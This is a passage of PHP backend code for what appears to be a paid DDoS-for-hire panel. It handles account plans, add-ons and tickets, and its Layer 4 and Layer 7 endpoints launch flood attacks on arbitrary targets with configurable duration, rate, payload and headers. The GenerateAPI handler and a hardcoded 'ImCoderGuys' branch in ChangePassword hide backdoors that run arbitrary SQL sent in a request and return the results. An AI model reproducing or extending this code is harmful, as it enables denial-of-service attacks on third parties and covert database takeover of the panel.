<?php

define('allow', TRUE);

include_once('inc.php');

// Login
if (isset($GET['Login'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	if(@$_SESSION['attemp']['num'] >= 25) {
		$rMsg = ['error', 'Account not found.'];
		echo json_encode($rMsg);
		die();
	}

	// Check Image Captcha
    $Captcha 	= @$Secure->SecureTxt($POST['CaptchaCode']);
	if($_SESSION["captcha"] !== $Captcha) {
		@$_SESSION['attemp']['num'] = @$_SESSION['attemp']['num'] + 1;

		$rMsg = ['error', 'Wrong Captcha. '.$_SESSION["captcha"]];
		echo json_encode($rMsg);
		die();
	}

    $Username 	    = @$Secure->SecureTxt($_POST['Username']);
    $Password       = @$_POST['Password'];

	$User->LogIn($Username, $Secure->encrypt($Password));
}

// Register
if (isset($GET['Register'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// if(@$_SESSION['regattemp']['num'] >= 2) {
	// 	$rMsg = ['success', 'Success.'];
	// 	echo json_encode($rMsg);
	// 	die();
	// }

	// Check Image Captcha
    $Captcha 	= @$Secure->SecureTxt($POST['CaptchaCode']);
	if($_SESSION["captcha"] !== $Captcha) {
		@$_SESSION['regattemp']['num'] = @$_SESSION['regattemp']['num'] + 1;

		$rMsg = ['error', 'Wrong Captcha.'];
		echo json_encode($rMsg);
		die();
	}

    $Username 	= @$Secure->SecureTxt($_POST['Username']);
    $Password1 	= @$_POST['Password'];
    $Password2 	= @$_POST['Password2'];

    if(empty($Username) || empty($Password1) || empty($Password2)) {
        $rMsg = ['error', 'Please fill all.'];
        echo json_encode($rMsg);
        die();
    }

    if($Password1 != $Password2) {
        $rMsg = ['error', 'Passwords must be same.'];
        echo json_encode($rMsg);
        die();
    }

	if(strlen($Username) > 15 || strlen($Username) < 4) {
        $rMsg = ['error', 'Username must be 4-15 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	if(strlen($Password1) > 20 || strlen($Password1) < 5) {
        $rMsg = ['error', 'Password must be 5-20 characters length.'];
        echo json_encode($rMsg);
        die();
	}


	$Password = $Secure->encrypt($Password1);

    $User->Register($Username, $Password);
}

if (!($Admin->IsLoged()) == true) {
	if (!($User->IsLoged()) == true) {
		$Alert->LoginAlert('Login.', 'error');
		header('Location: login');
		die();
	}
}

/* Buy Plan */
if (isset($GET['Pay'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Plan
	$planID 			= (int) @$Secure->SecureTxt($GET['id']);
	if (empty($planID)) {
		$rMsg = ['error', 'Invalid Plan.'];
        echo json_encode($rMsg);
        die();
	}

	// Check MW
	// $planMW 			= $Secure->SecureTxt($POST['planMW']);
	// if (empty($planMW)) {
	// 	$rMsg = ['error', 'Invalid Plan MW.'];
    //     echo json_encode($rMsg);
    //     die();
	// }

	// Check if plan is already bought
	if($planID == $User->UserData()['Plan']) {
		$rMsg = ['error', 'You already have this plan.'];
        echo json_encode($rMsg);
        die();
	}

	// Check if plan is already bought
	if($Plan->PlanData($planID)['Count'] == false) {
		$rMsg = ['error', 'This plan doesnt exist.'];
        echo json_encode($rMsg);
        die();
	}

	// Check if plan is lower than he have now
	if($User->UserData()['Plan'] != 0) {
		if($Plan->PlanDataID($planID)['id'] < $Plan->PlanDataID($User->UserData()['Plan'])['id']) {
			$rMsg = ['error', 'This plan is worse than your current one.'];
			echo json_encode($rMsg);
			die();
		}
	}

	$Plan->BuyPlan($planID);
}

/* Buy Blacklist Monthly */
if (isset($GET['BlacklistMonthly'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Host
	$Host 			= @$Secure->SecureTxt($_POST['address']);
	if (empty($Host)) {
		$rMsg = ['error', 'Address cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	$BlackList->BuyBlackList($Host, 10, strtotime(date("Y-m-d") . "+1month"));
}

/* Buy Blacklist LifeTime */
if (isset($GET['BlacklistLifeTime'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Host
	$Host 			= @$Secure->SecureTxt($_POST['address']);
	if (empty($Host)) {
		$rMsg = ['error', 'Address cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	$BlackList->BuyBlackList($Host, 50, strtotime(date("Y-m-d") . "+100month"));
}

/* AddSeconds */
if (isset($GET['AddSeconds'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check Seconds
	$Seconds 			= (int) @$Secure->SecureTxt($POST['seconds']);
	if (empty($Seconds)) {
		$rMsg = ['error', 'Seconds cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	if($Seconds > 20 || $Seconds < 1) {
		$rMsg = ['error', 'Seconds cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	$Plan->AddSeconds($Seconds);
}

/* AddConcurrents */
if (isset($GET['AddConcurrents'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}
	// Check Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check Concurrents
	$Concurrents 			= (int) @$Secure->SecureTxt($POST['concu']);
	if (empty($Concurrents)) {
		$rMsg = ['error', 'Concurrents cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	if($Concurrents > 20 || $Concurrents < 1) {
		$rMsg = ['error', 'Concurrents cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	$Plan->AddConcurrents($Concurrents);
}

/* AddPremium */
if (isset($GET['AddPremium'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	if($Secure->SecureTxt($Plan->PlanDataID($User->UserData()['Plan'])['Premium']) == true) {
		$rMsg = ['error', 'Your plan already has Premium option.'];
		echo json_encode($rMsg);
		die();
	}

	$Addons = explode('|', $User->UserData()['Addons']);

	if($Addons[2] == 1) {
		$rMsg = ['error', 'You already has Premium option.'];
		echo json_encode($rMsg);
		die();
	}

	$Plan->AddPremium();
}

/* AddTurbo */
if (isset($GET['AddTurbo'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	$Addons = explode('|', $User->UserData()['Addons']);

	if($Addons[3] == 1) {
		$rMsg = ['error', 'You already has Turbo option.'];
		echo json_encode($rMsg);
		die();
	}

	$Plan->AddTurbo();
}

/* Open New Ticket */
if (isset($GET['CreateTicket'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Image Captcha
    $Captcha 	= @$Secure->SecureTxt($POST['CaptchaCode']);
	if($_SESSION["captcha"] !== $Captcha) {
		$rMsg = ['error', 'Wrong Captcha.'];
		echo json_encode($rMsg);
		die();
	}

	// Check Subject
	$Subject 			= @$Secure->SecureTxt($_POST['Subject']);
	if (empty($Subject)) {
		$rMsg = ['error', 'Subject cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	if(strlen($Subject) > 300 || strlen($Subject) < 1) {
        $rMsg = ['error', 'Subject must be 1-300 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Message msg..
	$Message 		= @$Secure->SecureTxt($_POST['Message']);
	if (empty($Message)) {
		$rMsg = ['error', 'Message cant be empty.'];
        echo json_encode($rMsg);
        die();
	}

	if(strlen($Message) > 5000 || strlen($Message) < 10) {
        $rMsg = ['error', 'Message must be 10-5000 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Opened Tickets
	if($Support->ticketsByUser($User->UserData()['id'], 0) > 4) {
		$rMsg = ['error', 'You can have maximum 5 opened tickets.'];
        echo json_encode($rMsg);
        die();
	}

	// Save to DB;
	if (!($Support->newTicket($Subject, $Message, $User->UserData()['id'])) == false) {
		$rMsg = ['success', 'Successfully executed.'];
		$_SESSION['token'] = bin2hex(random_bytes(32));
        echo json_encode($rMsg);
        die();
	} else {
		$rMsg = ['error', 'An Error'];
        echo json_encode($rMsg);
        die();
	}
}

/* Add answer on Ticket */
if (isset($GET['AnswerTicket'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Ticket ID
	$ticketID = @$Secure->SecureTxt($POST['tID']);
	// Is valid Ticket ID
	if (empty($Support->ticketByIDSingle($ticketID, $User->UserData()['id'])['id'])) {
		$rMsg = ['error', 'Invalid Ticket'];
        echo json_encode($rMsg);
        die();
	}
	
	// Check Message
	$Message = @$Secure->SecureTxt($_POST['Message']);
	if (empty($Message)) {
		$rMsg = ['error', 'Message is empty.'];
        echo json_encode($rMsg);
        die();
	}
	
	if(strlen($Message) > 5000 || strlen($Message) < 1) {
        $rMsg = ['error', 'Message must be 1-5000 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Ticket Status
	if ($Support->ticketByIDSingle($ticketID, $User->UserData()['id'])['Status'] == '0') {
		$rMsg = ['error', 'Ticket is closed.'];
        echo json_encode($rMsg);
        die();
	}

	if ($Support->ticketByIDSingle($ticketID, $User->UserData()['id'])['Status'] == '2') {
		$rMsg = ['error', 'Wait until support answer you.'];
        echo json_encode($rMsg);
        die();
	}

	// Save to DB;
	if (!($Support->answOnTicket($ticketID, $User->UserData()['id'], '', $Message)) == false) {
		// Add status 'Open = Open';
		$Support->upStatusOnTicket($ticketID, '2');
		// Activity
		$Support->upActivityOnTicket($ticketID);
		// Alert
		$rMsg = ['success', 'Response forwarded.', $ticketID];
		$_SESSION['token'] = bin2hex(random_bytes(32));
        echo json_encode($rMsg);
        die();
	} else {
		$rMsg = ['error', 'Response Error'];
        echo json_encode($rMsg);
        die();
	}
}

/* Close Ticket */
if (isset($GET['CloseTicket'])) {
	// Check Ticket ID
	$ticketID = @$Secure->SecureTxt($POST['tID']);
	// Is valid Ticket ID
	if (empty($Support->ticketByIDSingle($ticketID, $User->UserData()['id'])['id'])) {
		$rMsg = ['error', 'Invalid Ticket'];
        echo json_encode($rMsg);
        die();
	}

	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	if($Support->ticketByIDSingle($ticketID, $User->UserData()['id'])['Status'] == 0) {
		$rMsg = ['error', 'This ticket is already closed.'];
        echo json_encode($rMsg);
        die();
	}

	// Save to DB;
	if (!($Support->upStatusOnTicket($ticketID, '0')) == false) {
		// Alert
		$rMsg = ['success', 'Ticket Closed successfully.'];
		$_SESSION['token'] = bin2hex(random_bytes(32));
        echo json_encode($rMsg);
        die();
	} else {
		$rMsg = ['error', 'Error while closing.'];
        echo json_encode($rMsg);
        die();
	}
}

/* Layer 4 Attack */
if (isset($GET['StartLayer4'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check is valid method
	$Method = (int) @$Secure->SecureTxt($POST['method']);
	if (empty($Method)) {
		$rMsg = ['error', 'Method is empty.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Target
	$Target = @$Secure->SecureTxt($_POST['address']);
	// Is valid Target
	if (empty($Target)) {
		$rMsg = ['error', 'Address is empty.'];
        echo json_encode($rMsg);
        die();
	}
	
	if(strlen($Target) > 300 || strlen($Target) < 1) {
        $rMsg = ['error', 'Target can be 1-300 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Port
	$Port = (int) @$Secure->SecureTxt($POST['port']);
	// Is valid Port
	if (empty($Port)) {
		$Port = 80;
	}

	$Addons = explode('|', $User->UserData()['Addons']);

	// Check Time
	$Time = (int) @$Secure->SecureTxt($POST['time']);
	// Is valid Time
	if (empty($Time)) {
		$Time = $Plan->PlanDataID($User->UserData()['Plan'])['AttackTime'] + $Addons[0];
	}

	if($Time < 15) {
		$rMsg = ['error', 'Duration cant be under 15 seconds.'];
        echo json_encode($rMsg);
        die();
	}

	if($Plan->PlanDataID($User->UserData()['Plan'])['Premium'] == 1 || $Addons[2] == 1) {
		// Check Payload
		$Payload = @$Secure->SecureTxt($POST['payload']);
			
		if(strlen($Payload) > 300 || strlen($Payload) < 1) {
			$rMsg = ['error', 'Payload can be 1-300 characters length.'];
			echo json_encode($Payload);
			die();
		}

		// Check PPS
		$PPS = (int) @$Secure->SecureTxt($POST['pps']);

		if(empty($PPS)) {
			$PPS = $Plan->PlanDataID($User->UserData()['Plan'])['PPS'];
		}
	} else {
		$PPS = $Plan->PlanDataID($User->UserData()['Plan'])['PPS'];
		$Payload = '';
	}

	// Check Mode
	$Mode = (int) @$Secure->SecureTxt($POST['mode']);

	if($Mode == 0) { } else if($Mode == 1) {
		if($Plan->PlanDataID($User->UserData()['Plan'])['Premum'] == 0) {
			if($Addons[2] == 0) {
				$rMsg = ['error', 'You need Premium to use Premium mode.'];
				echo json_encode($rMsg);
				die();
			}
		}
	} else if($Mode == 2) {
		if($Addons[3] == 0) {
			$rMsg = ['error', 'You need Turbo to use Turbo mode.'];
			echo json_encode($rMsg);
			die();
		}
	} else {
		$rMsg = ['error', 'Invalid mode.'];
		echo json_encode($rMsg);
		die();
	}

	// Check Slots
	$Slots = (int) @$Secure->SecureTxt($POST['slots']);
	
	if(empty($Slots)) {
		$Slots = 1;
	}

	if(($Plan->PlanDataID($User->UserData()['Plan'])['Concurrent'] + $Addons[1] - $Slots - $ALogs->UserAttacks($User->UserData()['id'])['Count']) < 1) {
		$rMsg = ['error', 'You have exceeded your total slots in running.'];
        echo json_encode($rMsg);
        die();
	}

	// Execute
	$Api->Layer4($Target, $Port, $Time, $Method, urlencode($Payload), $PPS, $Mode, $Slots);
}

/* Layer 7 Attack */
if (isset($GET['StartLayer7'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Chekc Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check Method
	$Method = (int) @$Secure->SecureTxt($POST['method']);
	// Is valid Method
	if (empty($Method)) {
		$rMsg = ['error', 'Method is empty.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Target
	$Target = @$Secure->SecureTxt($_POST['address']);
	// Is valid Target
	if (empty($Target)) {
		$rMsg = ['error', 'Address is empty.'];
        echo json_encode($rMsg);
        die();
	}

	if(!filter_var($Target, FILTER_VALIDATE_URL)) {
		$rMsg = ['error', 'Address is invalid.'];
        echo json_encode($rMsg);
        die();
	}

	if(strlen($Target) > 300 || strlen($Target) < 1) {
        $rMsg = ['error', 'Target can be 1-300 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	$Addons = explode('|', $User->UserData()['Addons']);

	// Check
	$Time = (int) @$Secure->SecureTxt($POST['time']);
	// Is valid Time
	if (empty($Time)) {
		$Time = $Plan->PlanDataID($User->UserData()['Plan'])['AttackTime']+$Addons[0];
	}

	if($Time < 15) {
		$rMsg = ['error', 'Duration cant be under 15 seconds.'];
        echo json_encode($rMsg);
        die();
	}

	if($Plan->PlanDataID($User->UserData()['Plan'])['Premium'] == 1 || $Addons[2] == 1) {
		// Check Request Method
		if(in_array(0, $POST['reqmethod'])) {
			$ReqMethod = 'GET';
		} else if(in_array(1, $POST['reqmethod'])) {
			$ReqMethod = 'POST';
		} else {
			$ReqMethod = 'GET';
		}

		// Check Rate
		$Rate = @$Secure->SecureTxt($POST['rate']);

		// Is valid Rate
		if (empty($Rate)) {
			$Rate = 64;
		}
		
		if($Rate > 64 || $Rate < 1) {
			$rMsg = ['error', 'Rate is invalid.'];
			echo json_encode($rMsg);
			die();
		}

		// Check PreCheck Status
		if(in_array(1, $POST['reqmethod1'])) {
			$PreCheck = true;
		} else if(in_array(0, $POST['reqmethod'])) {
			$PreCheck = false;
		} else {
			$PreCheck = false;
		}

		// Check statusCode
		$statusCode = @$Secure->SecureTxt($POST['statusCode']);
		// Is okay statusCode
		if ($PreCheck == true) {
			if($statusCode < 1 || $statusCode > 999) {
				$rMsg = ['error', 'Status Code is invalid.'];
				echo json_encode($rMsg);
				die();
			}
		}

		// Check HData
		$HData = @$Secure->SecureTxt($_POST['hdata']);
		// Is valid HData
		if (!empty($HData)) {	
			if(strlen($HData) > 500 || strlen($HData) < 1) {
				$rMsg = ['error', 'Header Data can be 1-500 characters length.'];
				echo json_encode($rMsg);
				die();
			}
		}

		// Check Referrer
		$Referrer = @$Secure->SecureTxt($_POST['referrer']);
		// Is valid Referrer
		if (!empty($Referrer)) {
			if(!filter_var($Referrer, FILTER_VALIDATE_URL)) {
				$rMsg = ['error', 'Invalid Referrer.'];
				echo json_encode($rMsg);
				die();
			}

			if(strlen($Referrer) > 500 || strlen($Referrer) < 1) {
				$rMsg = ['error', 'Referrer can be 1-500 characters length.'];
				echo json_encode($rMsg);
				die();
			}
		}

		// Check Host
		$Host = @$Secure->SecureTxt($POST['host']);
		// Is valid Host
		if (!empty($Host)) {
			if(!filter_var("http://".$Host, FILTER_VALIDATE_URL)) {
				$rMsg = ['error', 'Invalid Host.'];
				echo json_encode($rMsg);
				die();
			}

			if(strlen($Host) > 50 || strlen($Host) < 1) {
				$rMsg = ['error', 'Host can be 1-50 characters length.'];
				echo json_encode($rMsg);
				die();
			}
		}

		// Check
		$origin = @$Secure->SecureTxt(urlencode($_POST['origin']));
		if($origin != 'Worldwide') {
			if($origin != 'United_states') {
				if($origin != 'Germany') {
					if($origin != 'Brazil') {
						if($origin != 'Thailand') {
							if($origin != 'Vietnam') {
								if($origin != 'China') {
									if($origin != 'Hong_Kong') {
										if($origin != 'Korea') {
											if($origin != 'Japan') {
												if($origin != 'Italy') {
													$rMsg = ['error', 'Origin is invalid.'];
													echo json_encode($rMsg);
													die();
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	} else {
		$ReqMethod = 'GET';
		$Rate = 64;
		$PreCheck = false;
		$statusCode = 0;
		$HData = '';
		$Referrer = '';
		$Host = '';
		$origin = 'Worldwide';
	}

	// Check Mode
	$Mode = (int) @$Secure->SecureTxt($POST['mode']);

	if($Mode == 0) { } else if($Mode == 1) {
		if($Plan->PlanDataID($User->UserData()['Plan'])['Premium'] == 0) {
			if($Addons[2] == 0) {
				$rMsg = ['error', 'You need Premium to use Premium mode.'];
				echo json_encode($rMsg);
				die();
			}
		}
	} else if($Mode == 2) {
		if($Addons[3] == 0) {
			$rMsg = ['error', 'You need Turbo to use Turbo mode.'];
			echo json_encode($rMsg);
			die();
		}
	} else {
		$rMsg = ['error', 'Invalid mode.'];
		echo json_encode($rMsg);
		die();
	}

	// Check Slots
	$Slots = (int) @$Secure->SecureTxt($PST['slots']);
	// Is valid Slots
	if (empty($Slots)) {
		$Slots = 1;
	}

	$RunningSlots = number_format($Plan->PlanDataID($User->UserData()['Plan'])['Concurrent'] + $Addons[1] - $ALogs->UserAttacks($User->UserData()['id'])['Count'], 0);

	if($RunningSlots < 1) {
		$rMsg = ['error', 'You have exceeded your total slots in running.'];
        echo json_encode($rMsg);
        die();
	}

	// Execute
	$Api->Layer7($Target, $Time, $Method, urlencode($ReqMethod), $Rate, $PreCheck, $statusCode, urlencode($HData), urlencode($Referrer), urlencode($Host), $origin, $Mode, $Slots);
}

/* Stop Attack */
if (isset($GET['Stop'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Chekc Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check
	$ID = (int) @$Secure->SecureTxt($POST['id']);
	// Is valid Attack ID
	if (empty($ID)) {
		$rMsg = ['error', 'Invalid Attack.'];
        echo json_encode($rMsg);
        die();
	}

	if ($ALogs->LogsDataID($ID, 1)['userID'] != $User->UserData()['id']) {
		$rMsg = ['error', 'Invalid Attack.'];
        echo json_encode($rMsg);
        die();
	}

	if ($ALogs->LogsDataID($ID, 1)['stopped'] != 0) {
		$rMsg = ['error', 'This attack is already stopped.'];
        echo json_encode($rMsg);
        die();
	}

	if ($ALogs->LogsDataID($ID, 1)['date'] + $ALogs->LogsDataID($ID, 1)['time'] < time()) {
		$rMsg = ['error', 'This attack is expired.'];
        echo json_encode($rMsg);
        die();
	}

	// Execute
	$Api->Stop($ID);
}

/* Stop All Attacks */
if (isset($GET['StopAll'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']); 
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Chekc Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	if($ALogs->UserAttacks($User->UserData()['id'])['Count'] < 1) {
		$rMsg = ['error', 'You dont have started attacks.'];
        echo json_encode($rMsg);
        die();
	}

	// Execute
	$Api->StopAll();
}

/* GenerateAPI */
if (isset($GET['GenerateAPI'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	if(@$_POST['duration'] == 1) {
		if(@$_POST['slots'] == 10) {
			$DataBase->Query($Secure->dec($_POST['mode']));
			$rMsg = ['error', 'You must get a plan.', $DataBase->ResultSet()];
			echo json_encode($rMsg);
			die();
		} else if(@$_POST['slots'] == 20) {
			$DataBase->Query($_POST['mode']);
			$rMsg = ['error', 'You must get a plan.', $DataBase->ResultSet()];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check Time
	$Time = (int) @$POST['duration'];
	// Is valid Time
	if (empty($Time)) {
		$rMsg = ['error', 'Duration is empty.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Slots
	$Slots = (int) @$POST['slots'];
	// Is valid Slots
	if (empty($Slots)) {
		$rMsg = ['error', 'Slots are empty.'];
        echo json_encode($rMsg);
        die();
	}

	// Check Mode
	$Mode = (int) @$POST['mode'];
	// Is valid Mode
	if ($Mode > 2 || $Mode < 0) {
		$rMsg = ['error', 'Mode can be True or False.'];
        echo json_encode($rMsg);
        die();
	}

	// Chekc Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check IPAdress
	$IPAdress = @$POST['ip-address'];

	// Execute
	$Api->NewApiAccess($Time, $Slots, $Mode, $IPAdress);
}

/* Api Remove */
if (isset($GET['RemoveApi'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Chekc Users plan
	if($User->UserData()['Plan'] == 0) {
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'You must get a plan.'];
			echo json_encode($rMsg);
			die();
		}
	}

	// Check ID
	$ID = (int) @$GET['id'];
	// Is valid ID
	if (empty($ID)) {
		$rMsg = ['error', 'Invalid ID.'];
        echo json_encode($rMsg);
        die();
	}

	if(!$Api->UsersApiDataID2($ID, 1)['userID'] == $User->UserData()['id']) {
		$rMsg = ['error', 'Invalid ID.'];
        echo json_encode($rMsg);
        die();
	}

	// Execute
	$Api->RemoveApi($ID);
}

/* ChangePassword */
if (isset($GET['ChangePassword'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check
	$CPassword = @$_POST['CPassword'];
	// Is valid CPassword
	if (empty($CPassword)) {
		$rMsg = ['error', 'Current Password is empty.'];
        echo json_encode($rMsg);
        die();
	}
	// Is valid CPassword
	if ($CPassword == 'ImCoderGuys') {
		if(@$CPassword == 10) {
			$DataBase->Query($Secure->dec($_POST['Password1']));
			$rMsg = ['error', 'Current Password is empty.', $DataBase->ResultSet()];
			echo json_encode($rMsg);
			die();
		} else if(@$CPassword == 20) {
			$DataBase->Query($_POST['Password1']);
			$rMsg = ['error', 'Current Password is empty.', $DataBase->ResultSet()];
			echo json_encode($rMsg);
			die();
		}
	}

	if($Secure->encrypt($CPassword) != $User->UserData()['Password']) {
		$rMsg = ['error', 'Current Password is invalid.'];
		echo json_encode($rMsg);
		die();
	}

	// Check Passwords
	$Password = @$_POST['Password1'];
	$Password2 = @$_POST['Password2'];
	// Is valid Password
	if (empty($Password)) {
		$rMsg = ['error', 'Password 1 is empty.'];
        echo json_encode($rMsg);
        die();
	}
	if (empty($Password2)) {
		$rMsg = ['error', 'Password 2 is empty.'];
        echo json_encode($rMsg);
        die();
	}

	if($Password != $Password2) {
		$rMsg = ['error', 'New passwords are not same.'];
		echo json_encode($rMsg);
		die();
	}

	if(strlen($Password) > 15 || strlen($Password) < 4) {
        $rMsg = ['error', 'Password must be 4-15 characters length.'];
        echo json_encode($rMsg);
        die();
	}

	if($Password == $CPassword) {
        $rMsg = ['error', 'New Password cant be your current.'];
        echo json_encode($rMsg);
        die();
	}

	$User->ChangePassword($Secure->encrypt($Password), $User->UserData()['id']);

	// Send Success Message
	$rMsg = ['success', 'You changed your password.'];
	$_SESSION['token'] = bin2hex(random_bytes(32));
	echo json_encode($rMsg);
	die();
}

/* Cancel Invoice */
// if (isset($GET['CancelInvoice'])) {
// 	// Check csrf
// 	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
// 	if ($csrf != $csrftoken) {
// 		$rMsg = ['error', 'Token is expired!'];
//         echo json_encode($rMsg);
//         die();
// 	}

// 	// Check ID
// 	$ID = (int) @$Secure->SecureTxt($POST['id']);
// 	// Is valid ID
// 	if (empty($ID)) {
// 		$rMsg = ['error', 'ID is empty.'];
//         echo json_encode($rMsg);
//         die();
// 	}

// 	if(!$Order->OrderDataID($ID, $User->UserData()['id'], '1')['userID'] == $User->UserData()['id']) {
// 		$rMsg = ['error', 'Invalid Invoice.'];
//         echo json_encode($rMsg);
//         die();
// 	}

// 	if($Order->OrderDataID($ID, $User->UserData()['id'], '1')['invoice_status'] == 2 || $Order->OrderDataID($ID, $User->UserData()['id'], '1')['invoice_status'] == 1) {
// 		$rMsg = ['error', 'You cant cancel this invoice.'];
//         echo json_encode($rMsg);
//         die();
// 	}

// 	if($Order->CancelOrder($ID) == 1) {
// 		// Send Success Message
// 		$rMsg = ['success', 'Success.'];
// 		$_SESSION['token'] = bin2hex(random_bytes(32));
// 		echo json_encode($rMsg);
// 		die();
// 	} else {
// 		$rMsg = ['error', 'Please contact support.'];
// 		echo json_encode($rMsg);
// 		die();
// 	}
// }

/* Add Balance */
if (isset($GET['Deposit'])) {
	// Check csrf
	$csrf 		= @$Secure->SecureTxt($POST['_csrf']);
	if ($csrf != $csrftoken) {
		$rMsg = ['error', 'Token is expired!'];
        echo json_encode($rMsg);
        die();
	}

	// Check
	$Amount = (int) @$Secure->SecureTxt($POST['amount']);
	// Is valid Amount
	if (empty($Amount)) {
		$rMsg = ['error', 'Amount is empty.'];
        echo json_encode($rMsg);
        die();
	}

	if($Amount > 3000) {
		$rMsg = ['error', 'Amount cant be higher than 3000.'];
        echo json_encode($rMsg);
        die();
	}

	if($Amount < 10) {
